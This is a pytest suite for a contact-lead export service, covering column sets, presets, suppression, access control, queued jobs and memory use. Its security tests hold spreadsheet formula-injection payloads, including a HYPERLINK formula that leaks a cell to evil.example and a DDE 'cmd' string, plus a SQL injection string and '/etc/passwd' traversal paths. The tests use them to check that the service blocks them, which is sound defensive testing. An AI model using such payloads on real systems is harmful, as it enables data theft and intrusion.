import csv
import io
import json
import os

import httpx
import pytest
from openpyxl import load_workbook
from sqlalchemy import text

from app.db import sessionmaker
from app.exports import COLUMNS, run_export

from .helpers import ApiClient, make_client, seed_bulk_emails, seed_contact, seed_email, seed_org

REQUIRED = [
    "Email Address", "Email Status", "Confidence Score", "Published or Inferred", "First Name", "Last Name", "Full Name", "Job Title", "Department", "Company Name",
    "Company Legal Name", "Company Website", "Company Domain", "Company Registration Number", "Business Category", "Business Subcategory", "Country", "Region", "City",
    "Postal Code", "Business Phone", "Source URL", "Discovery Source", "Date Discovered", "Last Validated", "MX Status", "Catch-All Status", "Role Account",
    "Marketing Eligibility", "Suppression Status",
]


async def make_export(c, preset="full_intelligence", fmt="csv", filters=None, wait=True):
    r = await c.post("/api/exports", json={"preset": preset, "format": fmt, "filters": filters or {}, "wait": wait})
    assert r.status_code == 201, r.text
    return r.json()


async def download_csv(c, ex):
    r = await c.get(ex["download_url"])
    assert r.status_code == 200, r.text
    return list(csv.reader(io.StringIO(r.text))), r


async def _seed_basic():
    async with sessionmaker()() as s:
        cat = (await s.execute(text("INSERT INTO categories (slug,name,level) VALUES ('trades','Trades','category') RETURNING id"))).scalar_one()
        sub = (await s.execute(text("INSERT INTO categories (slug,name,level,parent_id) VALUES ('plumbers','Plumbers','subcategory',:p) RETURNING id"), {"p": cat})).scalar_one()
        org = await seed_org(s, "Acme Plumbing Ltd", category_id=sub, company_number="0123")
        await s.execute(text("UPDATE organisations SET phone='+44 20 7946 0000', postal_code='SW1A 1AA', trading_name='Acme Plumbing' WHERE id=:o"), {"o": org})
        await s.execute(text("INSERT INTO organisation_domains (organisation_id, domain, registrable_domain, website_url, verified_match_status, confidence) VALUES (:o,'acme.example.com','acme.example.com','https://acme.example.com','confirmed',0.99)"), {"o": org})
        cid = await seed_contact(s, org, "Jane Smith", "Managing Director")
        e1 = await seed_email(s, org, "jane@acme.example.com", contact_id=cid, confidence=91.4)
        e2 = await seed_email(s, org, "info@acme.example.com", role_type="generic", confidence=60, origin="pattern_inferred", marketing="needs_review")
        ev = (await s.execute(text("INSERT INTO evidence_sources (source_adapter, source_url, evidence_type) VALUES ('company_websites','https://acme.example.com/contact','mailto') RETURNING id"))).scalar_one()
        await s.execute(text("INSERT INTO contact_evidence (email_id, evidence_id) VALUES (:e,:ev)"), {"e": e1, "ev": ev})
        await s.commit()
    return org, e1, e2


async def test_export_has_exactly_the_required_columns_and_known_values(operator_client):
    await _seed_basic()
    assert COLUMNS == REQUIRED
    ex = await make_export(operator_client)
    assert ex["status"] == "done" and ex["row_count"] == 2 and ex["file_size"] > 0
    rows, r = await download_csv(operator_client, ex)
    assert rows[0] == REQUIRED
    jane = next(dict(zip(rows[0], x, strict=True)) for x in rows[1:] if x[0] == "jane@acme.example.com")
    assert jane["Full Name"] == "Jane Smith" and jane["First Name"] == "Jane" and jane["Last Name"] == "Smith" and jane["Job Title"] == "Managing Director"
    assert jane["Company Name"] == "Acme Plumbing" and jane["Company Legal Name"] == "Acme Plumbing Ltd" and jane["Company Registration Number"] == "0123"
    assert jane["Company Domain"] == "acme.example.com" and jane["Company Website"] == "https://acme.example.com"
    assert jane["Business Category"] == "Trades" and jane["Business Subcategory"] == "Plumbers"
    assert jane["Source URL"] == "https://acme.example.com/contact" and jane["Published or Inferred"] == "Published" and jane["Role Account"] == "no"
    assert jane["Confidence Score"] == "91.4" and jane["MX Status"] == "accepts_mail" and jane["Suppression Status"] == "not_suppressed"
    assert jane["Business Phone"] == "'+44 20 7946 0000"  # formula guard applies to every text cell
    info = next(dict(zip(rows[0], x, strict=True)) for x in rows[1:] if x[0] == "info@acme.example.com")
    assert info["Published or Inferred"] == "Inferred" and info["Role Account"] == "yes" and info["First Name"] == "" and info["Source URL"] == ""  # unknown stays empty
    assert r.headers["content-type"].startswith("text/csv") and "attachment" in r.headers["content-disposition"] and r.headers["x-content-type-options"] == "nosniff"


async def test_csv_and_xlsx_formula_injection_protection(operator_client):
    async with sessionmaker()() as s:
        org = await seed_org(s, '=HYPERLINK("http://evil.example/?"&A1,"click")', city="@SUM(1+1)", region="-2+3")
        cid = await seed_contact(s, org, "+cmd|' /C calc'!A0 Smith", "\t=1+1")
        await seed_email(s, org, "victim@inject.example.com", contact_id=cid)
        await s.execute(text("UPDATE organisations SET trading_name='\r=1+1', phone='-5551234' WHERE id=:o"), {"o": org})
        await s.commit()
    c = operator_client
    rows, _ = await download_csv(c, await make_export(c, fmt="csv"))
    rec = dict(zip(rows[0], rows[1], strict=True))
    assert rec["Company Legal Name"].startswith("'=HYPERLINK") and rec["City"] == "'@SUM(1+1)" and rec["Region"] == "'-2+3"
    assert rec["Full Name"].startswith("'+cmd") and rec["Job Title"] == "'\t=1+1" and rec["Company Name"] == "'\r=1+1" and rec["Business Phone"] == "'-5551234"
    for cell in rows[1]:
        assert not cell or cell[0] not in "=+-@\t\r", cell
    ex = await make_export(c, fmt="xlsx")
    r = await c.get(ex["download_url"])
    assert r.headers["content-type"].startswith("application/vnd.openxmlformats")
    wb = load_workbook(io.BytesIO(r.content))
    ws = wb.active
    values = [[cell for cell in row] for row in ws.iter_rows(min_row=2, max_row=2)][0]
    hdr = [x.value for x in next(ws.iter_rows(min_row=1, max_row=1))]
    assert hdr == REQUIRED
    for cell in values:
        assert cell.data_type != "f"  # never stored as a formula
        if isinstance(cell.value, str) and cell.value:
            assert cell.value[0] not in "=+-@\t\r", cell.value
    names = {h: v.value for h, v in zip(hdr, values, strict=True)}
    assert names["Company Legal Name"].startswith("'=HYPERLINK")
    # JSONL needs no spreadsheet guard and keeps the raw value
    ex = await make_export(c, fmt="jsonl")
    line = json.loads((await c.get(ex["download_url"])).text.splitlines()[0])
    assert line["Company Legal Name"].startswith("=HYPERLINK") and set(line) == set(REQUIRED)


async def test_listmonk_preset_only_eligible_non_suppressed(operator_client):
    async with sessionmaker()() as s:
        org = await seed_org(s, "Listy Ltd")
        cid = await seed_contact(s, org, "Lee Lister", "CEO")
        await seed_email(s, org, "ok@listy.example.com", contact_id=cid, marketing="eligible", confidence=88)
        await seed_email(s, org, "review@listy.example.com", marketing="needs_review")
        await seed_email(s, org, "consent@listy.example.com", marketing="consent_required")
        await seed_email(s, org, "flagged@listy.example.com", marketing="eligible", suppressed=True)
        await seed_email(s, org, "optout@listy.example.com", marketing="opted_out")
        await seed_email(s, org, "entry@listy.example.com", marketing="eligible")
        await s.execute(text("INSERT INTO suppression_entries (kind, value, reason) VALUES ('email','entry@listy.example.com','manual')"))
        org2 = await seed_org(s, "Blocked Domain Ltd")
        await seed_email(s, org2, "a@blocked.example.com", marketing="eligible")
        await s.execute(text("INSERT INTO suppression_entries (kind, value, reason) VALUES ('domain','blocked.example.com','manual')"))
        org3 = await seed_org(s, "Blocked Company Ltd")
        await seed_email(s, org3, "a@company-blocked.example.com", marketing="eligible")
        await s.execute(text("INSERT INTO suppression_entries (kind, value, reason) VALUES ('company', :o, 'manual')"), {"o": str(org3)})
        await s.commit()
    c = operator_client
    ex = await make_export(c, "listmonk_ready", fmt="xlsx")  # format is forced to csv for Listmonk
    assert ex["format"] == "csv"
    rows, _ = await download_csv(c, ex)
    assert rows[0] == ["email", "name", "attributes"]
    assert [r[0] for r in rows[1:]] == ["ok@listy.example.com"]
    attrs = json.loads(rows[1][2])
    assert rows[1][1] == "Lee Lister" and attrs["company"] == "Listy Ltd" and attrs["country"] == "GB" and attrs["confidence"] == 88 and attrs["domain"] == "listy.example.com"
    assert "region" in attrs and "phone" not in attrs and all(v not in (None, "") for v in attrs.values())


async def test_presets_audit_columns_and_uniqueness(operator_client):
    org, e1, e2 = await _seed_basic()
    async with sessionmaker()() as s:
        org2 = await seed_org(s, "Second Ltd")
        await seed_email(s, org2, "a@second.example.com", confidence=70)
        await seed_email(s, org2, "b@second.example.com", confidence=95)
        await seed_email(s, org2, "c@shared-domain.example.com", confidence=50, role_type="sales")
        await seed_email(s, org, "d@shared-domain.example.com", confidence=55)
    c = operator_client
    audit = await make_export(c, "validation_audit")
    rows, _ = await download_csv(c, audit)
    assert rows[0][:30] == REQUIRED and "Confidence Breakdown" in rows[0] and "Syntax Status" in rows[0] and len(rows) == 7
    one = await make_export(c, "one_per_company")
    rows, _ = await download_csv(c, one)
    assert len(rows) == 3 and {r[0] for r in rows[1:]} >= {"b@second.example.com", "jane@acme.example.com"}  # best (published, highest confidence) per company
    dom = await make_export(c, "one_per_domain")
    rows, _ = await download_csv(c, dom)
    assert len(rows) - 1 == 3
    named = await make_export(c, "named_decision_makers")
    rows, _ = await download_csv(c, named)
    assert [r[0] for r in rows[1:]] == ["jane@acme.example.com"]
    roles = await make_export(c, "role_company_emails")
    assert roles["row_count"] == 2
    pub = await make_export(c, "published_business_emails", filters={"min_confidence": 90})
    assert pub["row_count"] == 2
    cust = await make_export(c, filters={"country": ["GB"], "exclude_catch_all": True, "exclude_suppressed": True, "contact_type": "role", "reachability": ["safe"]})
    assert cust["row_count"] == 2
    assert (await c.post("/api/exports", json={"preset": "nope", "format": "csv"})).status_code == 422
    assert (await c.post("/api/exports", json={"preset": "full_intelligence", "format": "pdf"})).status_code == 422
    assert (await c.post("/api/exports", json={"preset": "full_intelligence", "filters": {"country": ["GB'; DROP TABLE users;--"]}})).status_code in (201, 422)
    presets = (await c.get("/api/exports/presets")).json()
    assert {p["id"] for p in presets["presets"]} == {"full_intelligence", "published_business_emails", "named_decision_makers", "role_company_emails", "one_per_company", "one_per_domain", "listmonk_ready", "validation_audit"}
    prev = (await c.post("/api/exports/preview", json={"preset": "full_intelligence"})).json()
    assert prev["estimated_rows"] == 6 and prev["columns"] == REQUIRED


async def test_ownership_and_object_level_authorisation(app, operator_client, admin_client):
    await _seed_basic()
    ex = await make_export(operator_client)
    async with make_client("operator", app) as other:
        assert (await other.get(f"/api/exports/{ex['id']}")).status_code == 403
        assert (await other.get(f"/api/exports/{ex['id']}/download")).status_code == 403
        assert (await other.delete(f"/api/exports/{ex['id']}")).status_code == 403
        assert (await other.get("/api/exports")).json()["items"] == []
        ids = [i["id"] for i in (await other.get("/api/exports")).json()["items"]]
        assert ex["id"] not in ids
    async with make_client("viewer", app) as viewer:
        assert (await viewer.get(f"/api/exports/{ex['id']}/download")).status_code == 403
        assert (await viewer.post("/api/exports", json={"preset": "full_intelligence"})).status_code == 403
    assert (await admin_client.get(f"/api/exports/{ex['id']}/download")).status_code == 200
    assert [i["id"] for i in (await admin_client.get("/api/exports")).json()["items"]] == [ex["id"]]
    anon = ApiClient(transport=httpx.ASGITransport(app=app), base_url="http://test")
    assert (await anon.get(f"/api/exports/{ex['id']}/download")).status_code == 401
    # delete by owner removes the file
    path = os.path.join(os.environ["LEAD_EXPORT_DIR"], (await _file_name(ex["id"])))
    assert os.path.exists(path)
    assert (await operator_client.delete(f"/api/exports/{ex['id']}")).status_code == 200
    assert not os.path.exists(path)


async def _file_name(export_id):
    async with sessionmaker()() as s:
        return (await s.execute(text("SELECT file_path FROM exports WHERE id=:i"), {"i": export_id})).scalar_one()


async def test_download_is_path_traversal_safe(operator_client):
    await _seed_basic()
    ex = await make_export(operator_client)
    for evil in ("../../../../etc/passwd", "/etc/passwd", "..%2f..%2fetc%2fpasswd"):
        async with sessionmaker()() as s:
            await s.execute(text("UPDATE exports SET file_path=:p WHERE id=:i"), {"p": evil, "i": ex["id"]})
            await s.commit()
        r = await operator_client.get(f"/api/exports/{ex['id']}/download")
        assert r.status_code == 410 and "root:" not in r.text


async def test_queued_export_runs_via_worker_handler(operator_client):
    await _seed_basic()
    ex = await make_export(operator_client, wait=False)
    assert ex["status"] == "queued"
    async with sessionmaker()() as s:
        job = (await s.execute(text("SELECT j.id, j.run_id, j.stage, j.payload, j.attempts, j.dedupe_key, j.checkpoint, j.host_key, r.name FROM sourcing_jobs j JOIN sourcing_runs r ON r.id=j.run_id"))).one()
    assert job[2] == "export" and job[3] == {"export_id": ex["id"]} and job[8] == "system-export"
    from app import jobqueue as jq
    from app.pipeline import export_handler  # noqa: F401
    from app.worker import HANDLERS, JobContext

    assert "export" in HANDLERS and "retention" in HANDLERS
    async with sessionmaker()() as s:
        jobs = await jq.claim(s, "w1", ["export"], 5, 60)
        assert len(jobs) == 1
        ctx = JobContext(job=jobs[0], session=s, worker=None)  # type: ignore[arg-type]
        await HANDLERS["export"](ctx)
    done = (await operator_client.get(f"/api/exports/{ex['id']}")).json()
    assert done["status"] == "done" and done["row_count"] == 2 and done["download_url"]


async def test_failed_export_is_recorded(operator_client):
    await _seed_basic()
    ex = await make_export(operator_client, wait=False)
    async with sessionmaker()() as s:
        await s.execute(text("UPDATE exports SET filters = '{\"min_confidence\": \"abc\"}'::jsonb WHERE id=:i"), {"i": ex["id"]})
        await s.commit()
        res = await run_export(s, ex["id"])
        assert res.status == "failed" and res.error
    got = (await operator_client.get(f"/api/exports/{ex['id']}")).json()
    assert got["status"] == "failed" and got["download_url"] is None
    assert (await operator_client.get(f"/api/exports/{ex['id']}/download")).status_code == 409


CHILD = """
import asyncio, sys
from app.db import sessionmaker
from app.exports import run_export

async def main(i):
    async with sessionmaker()() as s:
        ex = await run_export(s, int(i))
        print(ex.status, ex.row_count, ex.file_path)

asyncio.run(main(sys.argv[1]))
"""


def _run_child(export_id: int) -> tuple[str, int, str]:
    import subprocess
    import sys
    import time

    t0 = time.time()
    out = subprocess.run([sys.executable, "-c", CHILD, str(export_id)], capture_output=True, text=True, timeout=600, cwd=os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
    assert out.returncode == 0, out.stderr[-2000:]
    status, rows, path = out.stdout.split()
    print("child", export_id, round(time.time() - t0, 1), "s")
    return status, int(rows), path


@pytest.mark.slow
async def test_200k_row_export_streams_with_bounded_memory(operator_client):
    """Runs the export in a fresh process and compares its peak RSS against a tiny export: memory must not scale with rows."""
    import resource

    async with sessionmaker()() as s:
        await seed_bulk_emails(s, 200_000)
        first_ids = list((await s.execute(text("SELECT id FROM email_addresses ORDER BY id LIMIT 5"))).scalars())

    async def queue(fmt, preset="full_intelligence", filters=None):
        r = await operator_client.post("/api/exports", json={"preset": preset, "format": fmt, "wait": False, "filters": filters or {}})
        assert r.status_code == 201
        return r.json()["id"]

    status, rows, _ = _run_child(await queue("csv", filters={"email_ids": first_ids}))
    assert (status, rows) == ("done", 5)
    base_kb = resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss
    big_id = await queue("csv")
    status, rows, fname = _run_child(big_id)
    peak_kb = resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss
    assert (status, rows) == ("done", 200_000)
    growth_mb = (peak_kb - base_kb) / 1024
    assert growth_mb < 60, f"RSS grew {growth_mb:.0f} MB while exporting 200k rows"
    path = os.path.join(os.environ["LEAD_EXPORT_DIR"], fname)
    assert os.path.getsize(path) > 30_000_000
    with open(path, newline="") as fh:
        assert sum(1 for _ in csv.reader(fh)) == 200_001
    # xlsx (write-only workbook) and uniqueness path stream as well
    status, rows, _ = _run_child(await queue("xlsx", "one_per_company"))
    peak2_kb = resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss
    assert (status, rows) == ("done", 40_000)
    assert (peak2_kb - base_kb) / 1024 < 200
